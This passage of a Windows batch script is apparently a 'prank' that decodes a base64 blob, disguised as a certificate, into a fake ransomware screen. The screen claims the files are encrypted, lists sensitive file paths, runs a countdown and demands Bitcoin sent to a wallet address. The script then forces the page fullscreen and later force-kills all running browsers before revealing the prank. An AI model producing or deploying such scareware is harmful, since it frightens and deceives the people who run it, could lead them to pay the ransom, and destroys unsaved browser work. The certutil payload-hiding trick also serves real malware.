echo cy1kb3QiPjwvZGl2PjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGF0 >> "%htmlfile%.b64"
echo dXMtbGluZSI+PHNwYW4+UkVNT1RFIEFDQ0VTUzwvc3Bhbj48ZGl2IGNsYXNzPSJz >> "%htmlfile%.b64"
echo dGF0dXMtZG90Ij48L2Rpdj48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0i >> "%htmlfile%.b64"
echo c3RhdHVzLWxpbmUiPjxzcGFuPlRSQUNJTkcgRElTQUJMRUQ8L3NwYW4+PGRpdiBj >> "%htmlfile%.b64"
echo bGFzcz0ic3RhdHVzLWRvdCI+PC9kaXY+PC9kaXY+CiAgICAgICAgPC9kaXY+CiAg >> "%htmlfile%.b64"
echo ICA8L2Rpdj4KCiAgICA8ZGl2IGNsYXNzPSJtYWluIj4KCiAgICAgICAgPGRpdiBj >> "%htmlfile%.b64"
echo bGFzcz0id2FybmluZy10aXRsZSI+CiAgICAgICAgICAgIFNZU1RFTSBDUklUSUNB >> "%htmlfile%.b64"
echo TDo8YnI+CiAgICAgICAgICAgIEZJTEVTIEFSRSBFTkNSWVBURUQKICAgICAgICA8 >> "%htmlfile%.b64"
echo L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0id2FybmluZy1zdWIiPgogICAgICAg >> "%htmlfile%.b64"
echo ICAgICBBbGwgZG9jdW1lbnRzLCBkYXRhYmFzZXMsIGJhY2t1cHMsIGFuZCBjcml0 >> "%htmlfile%.b64"
echo aWNhbCBzeXN0ZW0gZmlsZXMgb24gdGhpcyBtYWNoaW5lIGhhdmUgYmVlbiBzZWN1 >> "%htmlfile%.b64"
echo cmVkIHdpdGggYSBwcml2YXRlIEFFUy0yNTYga2V5LiBBdHRlbXB0cyB0byByZXN0 >> "%htmlfile%.b64"
echo YXJ0LCBzaHV0ZG93biwgb3IgbW9kaWZ5IGVuY3J5cHRlZCBkYXRhIHdpbGwgbGVh >> "%htmlfile%.b64"
echo ZCB0byBwZXJtYW5lbnQgZGF0YSBjb3JydXB0aW9uLgogICAgICAgIDwvZGl2PgoK >> "%htmlfile%.b64"
echo ICAgICAgICA8ZGl2IGNsYXNzPSJ0aW1lci1ib3giPgogICAgICAgICAgICA8ZGl2 >> "%htmlfile%.b64"
echo IGNsYXNzPSJ0aW1lci1sYWJlbCI+VElNRSBVTlRJTCBQUklWQVRFIEtFWSBERVNU >> "%htmlfile%.b64"
echo UlVDVElPTjwvZGl2PgogICAgICAgICAgICA8ZGl2IGlkPSJ0aW1lciI+MjQ6MDA6 >> "%htmlfile%.b64"
echo MDA8L2Rpdj4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0idGVy >> "%htmlfile%.b64"
echo bWluYWwiIGlkPSJ0ZXJtaW5hbCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InRl >> "%htmlfile%.b64"
echo cm1pbmFsLWhlYWRlciI+RU5DUllQVElPTiBMT0cgLy8gTElWRSBTVFJFQU08L2Rp >> "%htmlfile%.b64"
echo dj4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0icGF5bWVudC1i >> "%htmlfile%.b64"
echo b3giPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJwYXltZW50LXRpdGxlIj5TRU5E >> "%htmlfile%.b64"
echo IDAuMTQyIEJUQyBUTyBSRUNPVkVSIEFDQ0VTUzwvZGl2PgogICAgICAgICAgICA8 >> "%htmlfile%.b64"
echo ZGl2IGNsYXNzPSJidGMiPmJjMXFjYW1zenp6cHJhbmt4OXYzYzRkOHI2djV3Mnk4 >> "%htmlfile%.b64"
echo bTFrcXBsbTRzeHQ8L2Rpdj4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBj >> "%htmlfile%.b64"
echo bGFzcz0iZm9vdGVyIj5TSUdORUQgQlkgQ0FNU3p6ejwvZGl2PgoKICAgIDwvZGl2 >> "%htmlfile%.b64"
echo PgoKPC9kaXY+Cgo8c2NyaXB0Pgpjb25zdCB0ZXJtaW5hbCA9IGRvY3VtZW50Lmdl >> "%htmlfile%.b64"
echo dEVsZW1lbnRCeUlkKCd0ZXJtaW5hbCcpOwpjb25zdCBnbGl0Y2ggPSBkb2N1bWVu >> "%htmlfile%.b64"
echo dC5nZXRFbGVtZW50QnlJZCgnZ2xpdGNoJyk7CgovLyBMaXN0ZSBkZSBmaWNoaWVy >> "%htmlfile%.b64"
echo cyBwbHVzICJzw6lyaWV1c2UiCmNvbnN0IGZpbGVzID0gWwogICAgJ0M6L1VzZXJz >> "%htmlfile%.b64"
echo L0FkbWluL0RvY3VtZW50cy9UYXhfUmV0dXJuXzIwMjUucGRmJywKICAgICdDOi9V >> "%htmlfile%.b64"
echo c2Vycy9BZG1pbi9EZXNrdG9wL1Bhc3N3b3Jkcy50eHQnLAogICAgJ0M6L1VzZXJz >> "%htmlfile%.b64"
echo L0FkbWluL1BpY3R1cmVzL1ByaXZhdGUvQmFja3VwLnppcCcsCiAgICAnQzovV2lu >> "%htmlfile%.b64"
echo ZG93cy9TeXN0ZW0zMi9jb25maWcvU0FNJywKICAgICdEOi9Qcm9qZWN0cy9Tb3Vy >> "%htmlfile%.b64"
echo Y2UvZmluYWxfdjNfY29yZS5waHAnLAogICAgJ0M6L1VzZXJzL0FkbWluL0FwcERh >> "%htmlfile%.b64"
echo dGEvUm9hbWluZy9XYWxsZXQvd2FsbGV0LmRhdCcsCiAgICAnQzovVXNlcnMvQWRt >> "%htmlfile%.b64"
echo aW4vRG9jdW1lbnRzL0NvbnRyYWN0cy9OREFfY29uZmlkZW50aWFsLmRvY3gnLAog >> "%htmlfile%.b64"
echo ICAgJ0Q6L01lZGlhL0ZhbWlseS9BcmNoaXZlL3ZpZGVvXzIwMjMubXA0JywKICAg >> "%htmlfile%.b64"
echo ICdDOi9Vc2Vycy9BZG1pbi9Xb3JrL0J1ZGdldF9Gb3JlY2FzdF8yMDI2Lnhsc3gn >> "%htmlfile%.b64"
echo LAogICAgJ0M6L1VzZXJzL0FkbWluL0Nsb3VkL2JhY2t1cC5pc28nLAogICAgJ0M6 >> "%htmlfile%.b64"
echo L2luZXRwdWIvd3d3cm9vdC93ZWIuY29uZmlnJywKICAgICdDOi9Vc2Vycy9BZG1p >> "%htmlfile%.b64"
echo bi9Eb2N1bWVudHMvTWVkaWNhbC9yZWNvcmRzLnhtbCcKXTsKCmZ1bmN0aW9uIGFk >> "%htmlfile%.b64"
echo ZExpbmUoKSB7CiAgICBjb25zdCBkaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50 >> "%htmlfile%.b64"
echo KCdkaXYnKTsKICAgIGRpdi5jbGFzc05hbWUgPSAnbGluZSc7CiAgICBjb25zdCBm >> "%htmlfile%.b64"
echo aWxlID0gZmlsZXNbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogZmlsZXMubGVu >> "%htmlfile%.b64"
echo Z3RoKV07CiAgICAvLyBBam91dCBkJ3VuIHRpbWVzdGFtcCBmYWN0aWNlIHBvdXIg >> "%htmlfile%.b64"
echo bGUgdGVybWluYWwKICAgIGNvbnN0IHRpbWUgPSBuZXcgRGF0ZSgpLnRvTG9jYWxl >> "%htmlfile%.b64"
echo VGltZVN0cmluZygnZW4tR0InKTsKICAgIGRpdi50ZXh0Q29udGVudCA9IGBbJHt0 >> "%htmlfile%.b64"
echo aW1lfV0gW0VOQ1JZUFRFRF0gJHtmaWxlfS4uLiBET05FYDsKCiAgICB0ZXJtaW5h >> "%htmlfile%.b64"
echo bC5hcHBlbmRDaGlsZChkaXYpOwoKICAgIC8vIEdhcmRlIDE4IGxpZ25lcyBtYXgK >> "%htmlfile%.b64"
echo ICAgIGlmICh0ZXJtaW5hbC5jaGlsZHJlbi5sZW5ndGggPiAxOSkgewogICAgICAg >> "%htmlfile%.b64"
echo IHRlcm1pbmFsLnJlbW92ZUNoaWxkKHRlcm1pbmFsLmNoaWxkcmVuWzFdKTsKICAg >> "%htmlfile%.b64"
echo IH0KICAgIHRlcm1pbmFsLnNjcm9sbFRvcCA9IHRlcm1pbmFsLnNjcm9sbEhlaWdo >> "%htmlfile%.b64"
echo dDsKfQpzZXRJbnRlcnZhbChhZGRMaW5lLCAyMjApOyAvLyBWaXRlc3NlIGR1IHRl >> "%htmlfile%.b64"
echo cm1pbmFsCgovLyBUaW1lciAyNGgKbGV0IHNlY29uZHMgPSAyNCAqIDYwICogNjA7 >> "%htmlfile%.b64"
echo CmNvbnN0IHRpbWVyRWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGltZXIn >> "%htmlfile%.b64"
echo KTsKCmZ1bmN0aW9uIHVwZGF0ZVRpbWVyKCkgewogICAgbGV0IGggPSBNYXRoLmZs >> "%htmlfile%.b64"
echo b29yKHNlY29uZHMgLyAzNjAwKTsKICAgIGxldCBtID0gTWF0aC5mbG9vcigoc2Vj >> "%htmlfile%.b64"
echo b25kcyAlIDM2MDApIC8gNjApOwogICAgbGV0IHMgPSBzZWNvbmRzICUgNjA7Cgog >> "%htmlfile%.b64"
echo ICAgdGltZXJFbC50ZXh0Q29udGVudCA9CiAgICAgICAgYCR7aC50b1N0cmluZygp >> "%htmlfile%.b64"
echo LnBhZFN0YXJ0KDIsJzAnKX06JHttLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwnMCcp >> "%htmlfile%.b64"
echo fToke3MudG9TdHJpbmcoKS5wYWRTdGFydCgyLCcwJyl9YDsKCiAgICBpZihzZWNv >> "%htmlfile%.b64"
echo bmRzID4gMCkgc2Vjb25kcy0tOwp9CnNldEludGVydmFsKHVwZGF0ZVRpbWVyLCAx >> "%htmlfile%.b64"
echo MDAwKTsKdXBkYXRlVGltZXIoKTsKCi8vIEVmZmV0IGRlIGdsaXRjaCBmbGFzaCBh >> "%htmlfile%.b64"
echo bMOpYXRvaXJlCmZ1bmN0aW9uIHRyaWdnZXJHbGl0Y2goKSB7CiAgICBpZiAoTWF0 >> "%htmlfile%.b64"
echo aC5yYW5kb20oKSA+IDAuOCkgeyAvLyAyMCUgZGUgY2hhbmNlIGQndW4gZ3JvcyBn >> "%htmlfile%.b64"
echo bGl0Y2gKICAgICAgICBnbGl0Y2guc3R5bGUub3BhY2l0eSA9ICcxJzsKICAgICAg >> "%htmlfile%.b64"
echo ICBzZXRUaW1lb3V0KCgpID0+IGdsaXRjaC5zdHlsZS5vcGFjaXR5ID0gJzAnLCA1 >> "%htmlfile%.b64"
echo MCk7CiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7IGdsaXRjaC5zdHlsZS5vcGFj >> "%htmlfile%.b64"
echo aXR5ID0gJzEnOyB9LCAxMDApOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gZ2xp >> "%htmlfile%.b64"
echo dGNoLnN0eWxlLm9wYWNpdHkgPSAnMCcsIDE1MCk7CiAgICB9Cn0Kc2V0SW50ZXJ2 >> "%htmlfile%.b64"
echo YWwodHJpZ2dlckdsaXRjaCwgMzAwMCk7CgovLyBTb24gZGUgdGVybWluYWwgb3B0 >> "%htmlfile%.b64"
echo aW9ubmVsIChkw6ljb21tZW50ZXIgc2kgYmVzb2luLCBhdHRlbnRpb24gYydlc3Qg >> "%htmlfile%.b64"
echo cmVsb3UpCi8vIGZ1bmN0aW9uIHBsYXlOZXQoKSB7IHZhciBhdWRpbyA9IG5ldyBB >> "%htmlfile%.b64"
echo dWRpbygnaHR0cHM6Ly93d3cuc291bmRqYXkuY29tL2NvbW11bmljYXRpb24vc291 >> "%htmlfile%.b64"
echo bmRzL2RpYWwtdXAtbW9kZW0tMDEubXAzJyk7IGF1ZGlvLnZvbHVtZSA9IDAuMDU7 >> "%htmlfile%.b64"
echo IGF1ZGlvLnBsYXkoKTsgfQovLyB3aW5kb3cub25sb2FkID0gcGxheU5ldDsKCjwv >> "%htmlfile%.b64"
echo c2NyaXB0PgoKPC9ib2R5Pgo8L2h0bWw+ >> "%htmlfile%.b64"
echo -----END CERTIFICATE----- >> "%htmlfile%.b64"
certutil -decode "%htmlfile%.b64" "%htmlfile%" >nul 2>&1
del "%htmlfile%.b64" >nul 2>&1

start "" "%htmlfile%"
timeout /t 1 >nul
powershell -c "$wshell = New-Object -ComObject wscript.shell; Start-Sleep -Milliseconds 800; $wshell.SendKeys('{F11}')"

timeout /t 35 >nul
start explorer.exe

timeout /t 265 >nul

taskkill /f /im msedge.exe >nul 2>&1
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im firefox.exe >nul 2>&1
taskkill /f /im brave.exe >nul 2>&1
taskkill /f /im opera.exe >nul 2>&1
taskkill /f /im iexplore.exe >nul 2>&1
taskkill /f /im mshta.exe >nul 2>&1

color 2
cls
echo This was just a harmless prank script made by camzzz! (https://github.com/cameleonnbss)
echo No actual damage was done to your system.
echo.
echo Your files are completely safe :)
echo.
echo All done! Have a great day!
timeout /t 5 >nul
exit
